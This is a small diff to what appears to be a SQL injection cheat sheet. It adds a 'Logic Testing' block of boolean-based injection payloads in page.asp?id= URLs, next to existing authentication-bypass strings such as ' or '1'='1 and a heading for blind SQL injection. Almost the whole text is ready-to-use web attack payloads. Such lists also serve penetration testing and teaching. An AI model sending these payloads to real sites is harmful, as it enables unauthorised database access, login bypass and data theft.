@@ -158,6 +158,13 @@ admin' --
 ' or '1'='1
 ' or '1'='1 --
 ```
+**Logic Testing**
+```
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
+```
 
 **Verification: Blind SQLi**
 ```
